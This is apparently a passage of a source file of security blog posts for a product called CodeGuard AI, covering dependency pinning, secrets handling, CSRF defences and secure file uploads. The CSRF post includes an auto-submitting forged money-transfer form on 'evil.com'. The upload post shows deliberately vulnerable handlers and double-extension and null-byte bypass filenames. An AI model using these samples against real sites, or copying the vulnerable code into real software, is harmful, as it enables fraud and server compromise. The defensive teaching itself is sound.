{
  "dependencies": {
    "express": "4.18.2",  // Exact version, not ^4.18.2
    "lodash": "4.17.21"
  }
}
\\\`\\\`\\\`

\\\`\\\`\\\`bash
# Always commit lockfiles
git add package-lock.json  # npm
git add pnpm-lock.yaml     # pnpm
git add yarn.lock          # yarn
\\\`\\\`\\\`

### 3. Use npm ci in CI/CD

\\\`\\\`\\\`yaml
# GitHub Actions
- name: Install dependencies
  run: npm ci  # Uses exact lockfile versions

# NOT: npm install (can resolve newer versions)
\\\`\\\`\\\`

### 4. Review Before Installing

\\\`\\\`\\\`bash
# Check package health
npm info <package>

# View package contents before install
npm pack <package> --dry-run

# Check for known vulnerabilities
npx is-my-node-vulnerable
\\\`\\\`\\\`

### 5. Use a Security Scanner

\\\`\\\`\\\`bash
# Snyk
npx snyk test

# Socket.dev
npx socket scan

# OSS Index
npx auditjs ossi
\\\`\\\`\\\`

### 6. Implement Dependency Policies

\\\`\\\`\\\`json
// .npmrc
ignore-scripts=true
audit-level=moderate
\\\`\\\`\\\`

\\\`\\\`\\\`javascript
// Check licenses
const checker = require('license-checker');
checker.init({
  start: './',
  onlyAllow: 'MIT;Apache-2.0;ISC;BSD-3-Clause'
}, (err, packages) => {
  // Fail build if non-compliant licenses found
});
\\\`\\\`\\\`

### 7. Monitor for New Vulnerabilities

\\\`\\\`\\\`yaml
# GitHub Dependabot - .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
\\\`\\\`\\\`

### 8. Use Scoped Packages for Internal Code

\\\`\\\`\\\`bash
# Prevents dependency confusion attacks
npm init --scope=@yourcompany
npm publish --access restricted
\\\`\\\`\\\`

## Reading npm Audit Results

\\\`\\\`\\\`
┌───────────────┬──────────────────────────────────────────────┐
│ Critical      │ Prototype Pollution in lodash                │
├───────────────┼──────────────────────────────────────────────┤
│ Package       │ lodash                                       │
│ Patched in    │ >=4.17.21                                    │
│ Dependency of │ my-app                                       │
│ Path          │ my-app > some-lib > lodash                   │
│ More info     │ https://npmjs.com/advisories/1673            │
└───────────────┴──────────────────────────────────────────────┘
\\\`\\\`\\\`

## Dependency Security Checklist

- [ ] Run \\\`npm audit\\\` before every deployment
- [ ] Use exact versions in package.json
- [ ] Commit lockfiles to version control
- [ ] Use \\\`npm ci\\\` in CI/CD pipelines
- [ ] Enable Dependabot or similar monitoring
- [ ] Review new dependencies before adding
- [ ] Disable postinstall scripts in .npmrc
- [ ] Use scoped packages for internal code
- [ ] Scan regularly with CodeGuard AI

## Conclusion

Your dependencies are your responsibility. One compromised package can compromise your entire application. Regular auditing, careful version management, and continuous monitoring are essential.

CodeGuard AI scans your dependency tree for known vulnerabilities and suspicious patterns, alerting you before malicious code reaches production.
    \`
  },
  {
    slug: 'environment-variables-secrets-management',
    title: 'Secrets Management: Stop Committing Your API Keys',
    excerpt: 'Exposed credentials are the #1 cause of cloud breaches. Learn how to properly manage secrets, environment variables, and API keys in your applications.',
    category: 'Best Practices',
    tags: ['Secrets', 'Environment Variables', 'DevSecOps', 'Cloud Security'],
    author: 'CodeGuard AI',
    date: '2024-12-03',
    readTime: '9 min read',
    content: \`
## The Cost of Exposed Secrets

In 2023, over 10 million secrets were exposed in public GitHub repositories. Attackers scan for these 24/7 with automated tools. A single exposed AWS key can cost thousands in minutes.

## Common Secrets Exposure Patterns

### 1. Hardcoded in Source Code

\\\`\\\`\\\`javascript
// NEVER DO THIS
const stripe = require('stripe')('sk_live_abc123...');
const AWS_KEY = 'AKIAIOSFODNN7EXAMPLE';
const DB_PASSWORD = 'supersecret123';
\\\`\\\`\\\`

### 2. Committed .env Files

\\\`\\\`\\\`bash
# .env files should NEVER be committed
DATABASE_URL=postgresql://user:password@host/db
STRIPE_SECRET_KEY=sk_live_...
JWT_SECRET=my-super-secret-key
\\\`\\\`\\\`

### 3. Exposed in Client-Side Code

\\\`\\\`\\\`javascript
// This is visible to everyone!
const config = {
  apiKey: 'AIzaSyA...',  // Visible in browser
  stripeKey: 'sk_live...'  // DANGER!
};
\\\`\\\`\\\`

### 4. Logged Accidentally

\\\`\\\`\\\`javascript
// Secrets end up in logs
console.log('Config:', config);
console.log('Request headers:', req.headers);  // May contain auth tokens
\\\`\\\`\\\`

## How CodeGuard AI Detects Secrets

We scan for:

\\\`\\\`\\\`javascript
// API key patterns
const apiKey = 'sk_live_EXAMPLE_KEY_REPLACE_ME';

// AWS credentials
const accessKey = 'AKIAIOSFODNN7EXAMPLE';

// Database connection strings
const dbUrl = 'postgres://user:pass@localhost/db';

// JWT secrets
const secret = 'my-jwt-secret';  // Low entropy

// Private keys
const privateKey = \\\`-----BEGIN RSA PRIVATE KEY-----\\\`;
\\\`\\\`\\\`

## Best Practices for Secrets Management

### 1. Use Environment Variables

\\\`\\\`\\\`javascript
// Load from environment
const stripeKey = process.env.STRIPE_SECRET_KEY;
const dbUrl = process.env.DATABASE_URL;

if (!stripeKey) {
  throw new Error('STRIPE_SECRET_KEY is required');
}
\\\`\\\`\\\`

### 2. Never Commit .env Files

\\\`\\\`\\\`gitignore
# .gitignore
.env
.env.local
.env.*.local
*.pem
*.key
\\\`\\\`\\\`

\\\`\\\`\\\`bash
# Create a template instead
# .env.example (commit this)
DATABASE_URL=
STRIPE_SECRET_KEY=
JWT_SECRET=
\\\`\\\`\\\`

### 3. Use a Secrets Manager

\\\`\\\`\\\`javascript
// AWS Secrets Manager
import { SecretsManager } from '@aws-sdk/client-secrets-manager';

const client = new SecretsManager({ region: 'us-east-1' });

async function getSecret(secretName) {
  const response = await client.getSecretValue({ SecretId: secretName });
  return JSON.parse(response.SecretString);
}

// Usage
const dbCredentials = await getSecret('prod/database');
\\\`\\\`\\\`

### 4. Rotate Secrets Regularly

\\\`\\\`\\\`javascript
// Implement rotation
async function rotateApiKey() {
  // Generate new key
  const newKey = await generateNewKey();

  // Update in secrets manager
  await updateSecret('api-key', newKey);

  // Update dependent services
  await notifyServices(newKey);

  // Revoke old key after grace period
  setTimeout(() => revokeOldKey(), 24 * 60 * 60 * 1000);
}
\\\`\\\`\\\`

### 5. Use Different Secrets Per Environment

\\\`\\\`\\\`bash
# Different secrets for each environment
# Production
STRIPE_KEY=sk_live_xxx

# Development
STRIPE_KEY=sk_test_xxx

# Never use production secrets in development!
\\\`\\\`\\\`

### 6. Validate Required Secrets at Startup

\\\`\\\`\\\`javascript
// config/secrets.js
const required = [
  'DATABASE_URL',
  'JWT_SECRET',
  'STRIPE_SECRET_KEY'
];

function validateSecrets() {
  const missing = required.filter(key => !process.env[key]);

  if (missing.length > 0) {
    throw new Error(\\\`Missing required secrets: \\\${missing.join(', ')}\\\`);
  }
}

// Call on startup
validateSecrets();
\\\`\\\`\\\`

### 7. Scan for Secrets in CI/CD

\\\`\\\`\\\`yaml
# GitHub Actions
- name: Scan for secrets
  uses: trufflesecurity/trufflehog@main
  with:
    path: ./
    base: main

# GitLeaks
- name: GitLeaks
  uses: gitleaks/gitleaks-action@v2
  env:
    GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}
\\\`\\\`\\\`

### 8. Handle Secrets in Logs

\\\`\\\`\\\`javascript
// Redact secrets from logs
const sensitiveKeys = ['password', 'secret', 'token', 'key', 'auth'];

function redactSecrets(obj) {
  const redacted = { ...obj };

  for (const key of Object.keys(redacted)) {
    if (sensitiveKeys.some(s => key.toLowerCase().includes(s))) {
      redacted[key] = '[REDACTED]';
    }
  }

  return redacted;
}

// Usage
console.log('Request:', redactSecrets(req.body));
\\\`\\\`\\\`

## What to Do If Secrets Are Exposed

1. **Revoke immediately** - Don't wait, rotate now
2. **Audit usage** - Check logs for unauthorized access
3. **Rotate all related secrets** - Attackers may have accessed others
4. **Scan git history** - Use BFG or git-filter-repo to remove
5. **Enable alerts** - Set up monitoring for suspicious activity

\\\`\\\`\\\`bash
# Remove secrets from git history
# Using BFG Repo-Cleaner
bfg --replace-text secrets.txt repo.git

# Using git-filter-repo
git filter-repo --replace-text secrets.txt
\\\`\\\`\\\`

## Secrets Management Checklist

- [ ] No hardcoded secrets in code
- [ ] .env files in .gitignore
- [ ] .env.example template committed
- [ ] Secrets validated at startup
- [ ] Using secrets manager in production
- [ ] Different secrets per environment
- [ ] Secret rotation policy in place
- [ ] CI/CD secret scanning enabled
- [ ] Logs redact sensitive data
- [ ] Regular scanning with CodeGuard AI

## Conclusion

Secret exposure is preventable. Use environment variables, secret managers, and automated scanning to keep your credentials safe.

CodeGuard AI continuously scans your codebase for exposed secrets, hardcoded credentials, and insecure patterns—catching leaks before they reach production.
    \`
  },
  {
    slug: 'csrf-protection-guide',
    title: 'CSRF Attacks: Protecting Users from Forged Requests',
    excerpt: 'Cross-Site Request Forgery tricks users into performing unwanted actions. Learn how CSRF works and implement bulletproof protection.',
    category: 'Security',
    tags: ['CSRF', 'Web Security', 'Session Security', 'OWASP Top 10'],
    author: 'CodeGuard AI',
    date: '2024-12-02',
    readTime: '8 min read',
    content: \`
## What is CSRF?

Cross-Site Request Forgery (CSRF) is an attack that tricks authenticated users into submitting unwanted requests. If a user is logged into their bank and visits a malicious site, that site could transfer money from their account without their knowledge.

## How CSRF Attacks Work

### The Attack Flow

1. User logs into \\\`bank.com\\\` (gets session cookie)
2. User visits \\\`evil.com\\\` (in another tab)
3. \\\`evil.com\\\` contains hidden form/request to \\\`bank.com\\\`
4. Browser automatically includes \\\`bank.com\\\` cookies
5. Bank processes the forged request as legitimate

### Example Attack

\\\`\\\`\\\`html
<!-- On evil.com -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />

<!-- Or with a form -->
<form action="https://bank.com/transfer" method="POST" id="csrfForm">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.getElementById('csrfForm').submit();</script>
\\\`\\\`\\\`

### Vulnerable Code

\\\`\\\`\\\`javascript
// VULNERABLE - No CSRF protection
app.post('/api/transfer', (req, res) => {
  const { to, amount } = req.body;
  // Relies only on session cookie for auth
  transferMoney(req.user.id, to, amount);
  res.json({ success: true });
});
\\\`\\\`\\\`

## Real-World CSRF Attacks

- **Netflix (2006)**: Attackers could add movies to users' queues
- **Gmail (2007)**: Email forwarding rules could be changed
- **ING Direct (2008)**: Money transfers possible via CSRF
- **Facebook Apps**: Multiple CSRF vulnerabilities in third-party apps

## How CodeGuard AI Detects CSRF Vulnerabilities

We identify:

\\\`\\\`\\\`javascript
// State-changing endpoints without CSRF protection
app.post('/api/settings', (req, res) => {
  // No CSRF token validation
  updateSettings(req.body);
});

// Missing SameSite cookie attribute
res.cookie('session', token, {
  httpOnly: true
  // Missing: sameSite: 'strict'
});

// Forms without CSRF tokens
<form action="/update" method="POST">
  <!-- No hidden CSRF token -->
</form>
\\\`\\\`\\\`

## CSRF Protection Strategies

### 1. Synchronizer Token Pattern

\\\`\\\`\\\`javascript
import crypto from 'crypto';

// Generate CSRF token
function generateCsrfToken() {
  return crypto.randomBytes(32).toString('hex');
}

// Middleware to set CSRF token
app.use((req, res, next) => {
  if (!req.session.csrfToken) {
    req.session.csrfToken = generateCsrfToken();
  }
  res.locals.csrfToken = req.session.csrfToken;
  next();
});

// Validate CSRF token
function validateCsrf(req, res, next) {
  const token = req.body._csrf || req.headers['x-csrf-token'];

  if (token !== req.session.csrfToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  next();
}

// Protected route
app.post('/api/transfer', validateCsrf, transferHandler);
\\\`\\\`\\\`

### 2. Double Submit Cookie

\\\`\\\`\\\`javascript
// Set CSRF token as cookie
app.use((req, res, next) => {
  if (!req.cookies.csrfToken) {
    const token = crypto.randomBytes(32).toString('hex');
    res.cookie('csrfToken', token, {
      httpOnly: false,  // JS needs to read it
      secure: true,
      sameSite: 'strict'
    });
  }
  next();
});

// Client must include token in header
// Frontend code:
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': getCookie('csrfToken')
  },
  body: JSON.stringify(data)
});

// Server validates header matches cookie
function validateCsrf(req, res, next) {
  const cookieToken = req.cookies.csrfToken;
  const headerToken = req.headers['x-csrf-token'];

  if (!cookieToken || cookieToken !== headerToken) {
    return res.status(403).json({ error: 'CSRF validation failed' });
  }
  next();
}
\\\`\\\`\\\`

### 3. SameSite Cookies (Modern Approach)

\\\`\\\`\\\`javascript
// Set SameSite attribute on session cookies
app.use(session({
  cookie: {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',  // Prevents CSRF!
    maxAge: 3600000
  }
}));

// Or with direct cookie setting
res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});
\\\`\\\`\\\`

**SameSite Values:**
- \\\`strict\\\`: Cookie never sent cross-site
- \\\`lax\\\`: Sent on top-level navigation only
- \\\`none\\\`: Always sent (requires \\\`secure\\\`)

### 4. Custom Request Headers

APIs can require custom headers that cannot be set cross-origin:

\\\`\\\`\\\`javascript
// Require custom header
function requireCustomHeader(req, res, next) {
  if (!req.headers['x-requested-with']) {
    return res.status(403).json({ error: 'Missing required header' });
  }
  next();
}

// Client includes header
fetch('/api/data', {
  headers: {
    'X-Requested-With': 'XMLHttpRequest'
  }
});
\\\`\\\`\\\`

### 5. Using csurf Middleware

\\\`\\\`\\\`javascript
import csrf from 'csurf';

// Setup CSRF middleware
const csrfProtection = csrf({ cookie: true });

// Apply to state-changing routes
app.post('/api/transfer', csrfProtection, (req, res) => {
  // req.csrfToken() generates tokens
  res.json({ success: true });
});

// Include token in forms
app.get('/form', csrfProtection, (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});
\\\`\\\`\\\`

## React Integration

\\\`\\\`\\\`jsx
// Get CSRF token from meta tag or cookie
function getCsrfToken() {
  return document.querySelector('meta[name="csrf-token"]')?.content
    || getCookie('csrfToken');
}

// Include in all requests
const api = axios.create({
  headers: {
    'X-CSRF-Token': getCsrfToken()
  }
});

// Or with fetch
async function securePost(url, data) {
  return fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': getCsrfToken()
    },
    body: JSON.stringify(data)
  });
}
\\\`\\\`\\\`

## CSRF Protection Checklist

- [ ] All state-changing requests validate CSRF tokens
- [ ] Session cookies have SameSite=strict or lax
- [ ] CSRF tokens are cryptographically random
- [ ] Tokens regenerate after login
- [ ] GET requests don't modify state
- [ ] Custom headers required for API calls
- [ ] Forms include hidden CSRF token field
- [ ] Token validation fails securely (403 response)

## When CSRF Protection Is NOT Needed

- GET requests (should be idempotent)
- API endpoints using header-based auth (Bearer tokens)
- Truly public actions (no user state changes)

## Conclusion

CSRF is a serious but preventable vulnerability. Modern browsers support SameSite cookies, but defense-in-depth with CSRF tokens provides robust protection.

CodeGuard AI automatically detects missing CSRF protections and vulnerable cookie configurations in your codebase.
    \`
  },
  {
    slug: 'secure-file-upload-implementation',
    title: 'Secure File Uploads: Preventing Malicious File Attacks',
    excerpt: 'File upload functionality is a common attack vector. Learn how to validate, sanitize, and store uploaded files securely to prevent remote code execution.',
    category: 'Security',
    tags: ['File Upload', 'Input Validation', 'Malware', 'Web Security'],
    author: 'CodeGuard AI',
    date: '2024-12-01',
    readTime: '10 min read',
    content: \`
## Why File Uploads Are Dangerous

File upload functionality is one of the most critical attack surfaces in web applications. A single vulnerability can lead to:

- Remote Code Execution (RCE)
- Server compromise
- Malware distribution
- Denial of Service (DoS)
- Cross-Site Scripting (XSS)

## Common File Upload Vulnerabilities

### 1. No Extension Validation

\\\`\\\`\\\`javascript
// VULNERABLE - Accepts any file type
app.post('/upload', upload.single('file'), (req, res) => {
  // Attacker uploads malicious.php
  const path = \\\`uploads/\\\${req.file.originalname}\\\`;
  fs.renameSync(req.file.path, path);
});
\\\`\\\`\\\`

### 2. Client-Side Only Validation

\\\`\\\`\\\`html
<!-- VULNERABLE - Easily bypassed -->
<input type="file" accept=".jpg,.png">
\\\`\\\`\\\`

### 3. Extension-Only Check

\\\`\\\`\\\`javascript
// VULNERABLE - Only checks extension
if (filename.endsWith('.jpg')) {
  // Attacker: shell.php.jpg or shell.php%00.jpg
  processImage(file);
}
\\\`\\\`\\\`

### 4. Serving Uploads from Same Domain

\\\`\\\`\\\`javascript
// VULNERABLE - XSS via uploaded HTML/SVG
app.use('/uploads', express.static('uploads'));
// Attacker uploads malicious.html, visits /uploads/malicious.html
\\\`\\\`\\\`

## How CodeGuard AI Detects Upload Vulnerabilities

We identify:

\\\`\\\`\\\`javascript
// Missing file type validation
upload.single('file'); // No filter

// Dangerous file storage
fs.writeFileSync(\\\`uploads/\\\${req.file.originalname}\\\`, data);

// Executable upload paths
app.use('/uploads', express.static('uploads'));

// Missing size limits
multer({ dest: 'uploads/' }); // No limits
\\\`\\\`\\\`

## Secure File Upload Implementation

### 1. Validate File Type by Magic Bytes

\\\`\\\`\\\`javascript
import fileType from 'file-type';

const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];

async function validateFileType(buffer) {
  const type = await fileType.fromBuffer(buffer);

  if (!type || !ALLOWED_TYPES.includes(type.mime)) {
    throw new Error('Invalid file type');
  }

  return type;
}

app.post('/upload', async (req, res) => {
  const buffer = req.file.buffer;

  // Validate magic bytes, not just extension
  const type = await validateFileType(buffer);

  // Use the detected extension, not user-provided
  const filename = \\\`\\\${uuid()}.\\\${type.ext}\\\`;
});
\\\`\\\`\\\`

### 2. Sanitize Filenames

\\\`\\\`\\\`javascript
import path from 'path';
import { v4 as uuid } from 'uuid';

function sanitizeFilename(originalName) {
  // Option 1: Generate completely new name (safest)
  const ext = path.extname(originalName).toLowerCase();
  return \\\`\\\${uuid()}\\\${ext}\\\`;

  // Option 2: Sanitize original name
  const sanitized = originalName
    .replace(/[^a-zA-Z0-9.-]/g, '_')  // Remove special chars
    .replace(/\\.+/g, '.')             // Prevent double extensions
    .substring(0, 100);                // Limit length

  return \\\`\\\${Date.now()}_\\\${sanitized}\\\`;
}
\\\`\\\`\\\`

### 3. Enforce File Size Limits

\\\`\\\`\\\`javascript
import multer from 'multer';

const upload = multer({
  limits: {
    fileSize: 5 * 1024 * 1024,  // 5MB max
    files: 1                     // Single file only
  },
  fileFilter: (req, file, cb) => {
    const allowed = ['image/jpeg', 'image/png', 'application/pdf'];
    if (allowed.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error('Invalid file type'), false);
    }
  }
});
\\\`\\\`\\\`

### 4. Store Files Securely

\\\`\\\`\\\`javascript
import path from 'path';

// Store OUTSIDE webroot
const UPLOAD_DIR = path.resolve(__dirname, '../storage/uploads');

// Never serve directly - use a controller
app.get('/files/:id', authenticate, async (req, res) => {
  const file = await FileModel.findById(req.params.id);

  // Verify user has access
  if (file.userId !== req.user.id) {
    return res.status(403).json({ error: 'Access denied' });
  }

  // Prevent path traversal
  const safePath = path.join(UPLOAD_DIR, path.basename(file.storagePath));

  // Set proper content type
  res.type(file.mimeType);
  res.sendFile(safePath);
});
\\\`\\\`\\\`

### 5. Use Cloud Storage

\\\`\\\`\\\`javascript
import { S3Client, PutObjectCommand } from '@aws-sdk/client-s3';

const s3 = new S3Client({ region: 'us-east-1' });

async function uploadToS3(file, filename) {
  const command = new PutObjectCommand({
    Bucket: process.env.S3_BUCKET,
    Key: \\\`uploads/\\\${filename}\\\`,
    Body: file.buffer,
    ContentType: file.mimetype,
    // Prevent execution
    ContentDisposition: 'attachment'
  });

  await s3.send(command);

  // Return signed URL or CDN URL
  return \\\`https://cdn.example.com/uploads/\\\${filename}\\\`;
}
\\\`\\\`\\\`

### 6. Scan for Malware

\\\`\\\`\\\`javascript
import ClamScan from 'clamscan';

const clam = await new ClamScan().init({
  clamdscan: {
    socket: '/var/run/clamav/clamd.ctl'
  }
});

async function scanFile(filePath) {
  const { isInfected, viruses } = await clam.scanFile(filePath);

  if (isInfected) {
    // Delete infected file
    fs.unlinkSync(filePath);
    throw new Error(\\\`Malware detected: \\\${viruses.join(', ')}\\\`);
  }

  return true;
}
\\\`\\\`\\\`

### 7. Process Images to Remove Metadata/Payloads

\\\`\\\`\\\`javascript
import sharp from 'sharp';

async function processImage(inputBuffer) {
  // Re-encode image (strips metadata and potential payloads)
  const processed = await sharp(inputBuffer)
    .resize(2000, 2000, {
      fit: 'inside',
      withoutEnlargement: true
    })
    .jpeg({ quality: 85 })  // Or .png() etc.
    .toBuffer();

  return processed;
}
\\\`\\\`\\\`

### 8. Content-Disposition for Downloads

\\\`\\\`\\\`javascript
app.get('/download/:id', async (req, res) => {
  const file = await getFile(req.params.id);

  // Force download, prevent browser execution
  res.set({
    'Content-Disposition': \\\`attachment; filename="\\\${file.name}"\\\`,
    'Content-Type': 'application/octet-stream',
    'X-Content-Type-Options': 'nosniff'
  });

  res.sendFile(file.path);
});
\\\`\\\`\\\`

## Complete Secure Upload Example

\\\`\\\`\\\`javascript
import express from 'express';
import multer from 'multer';
import fileType from 'file-type';
import sharp from 'sharp';
import { v4 as uuid } from 'uuid';
import path from 'path';

const ALLOWED_TYPES = {
  'image/jpeg': 'jpg',
  'image/png': 'png',
  'image/gif': 'gif'
};

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 5 * 1024 * 1024 }
});

app.post('/upload',
  authenticate,
  upload.single('image'),
  async (req, res) => {
    try {
      // Validate file exists
      if (!req.file) {
        return res.status(400).json({ error: 'No file provided' });
      }

      // Validate magic bytes
      const type = await fileType.fromBuffer(req.file.buffer);
      if (!type || !ALLOWED_TYPES[type.mime]) {
        return res.status(400).json({ error: 'Invalid file type' });
      }

      // Process image (sanitize, resize, strip metadata)
      const processed = await sharp(req.file.buffer)
        .resize(1200, 1200, { fit: 'inside', withoutEnlargement: true })
        .jpeg({ quality: 85 })
        .toBuffer();

      // Generate safe filename
      const filename = \\\`\\\${uuid()}.jpg\\\`;
      const storagePath = path.join(UPLOAD_DIR, filename);

      // Save file
      await fs.promises.writeFile(storagePath, processed);

      // Store metadata in database
      const fileRecord = await File.create({
        userId: req.user.id,
        originalName: req.file.originalname,
        storagePath: filename,
        mimeType: 'image/jpeg',
        size: processed.length
      });

      res.json({
        id: fileRecord.id,
        url: \\\`/files/\\\${fileRecord.id}\\\`
      });

    } catch (error) {
      console.error('Upload error:', error);
      res.status(500).json({ error: 'Upload failed' });
    }
  }
);
\\\`\\\`\\\`

## File Upload Security Checklist

- [ ] Validate file type by magic bytes, not extension
- [ ] Enforce strict file size limits
- [ ] Generate new filenames (UUID)
- [ ] Store files outside webroot
- [ ] Use separate domain/CDN for serving
- [ ] Re-encode images to strip metadata
- [ ] Scan uploads for malware
- [ ] Set Content-Disposition: attachment
- [ ] Set X-Content-Type-Options: nosniff
- [ ] Implement access control for downloads
- [ ] Regular scanning with CodeGuard AI

## Conclusion

File uploads are inherently dangerous. Never trust file extensions, always validate content, and isolate uploaded files from your application. Defense in depth is essential.

CodeGuard AI scans your upload handlers for missing validations, insecure storage patterns, and potential execution vulnerabilities.
    \`
  }
];

export function getBlogPost(slug: string): BlogPost | undefined {
  return blogPosts.find(post => post.slug === slug);
}

export function getAllBlogPosts(): BlogPost[] {
  return blogPosts.sort((a, b) => new Date(b.date).getTime() - new Date(a.date).getTime());
}
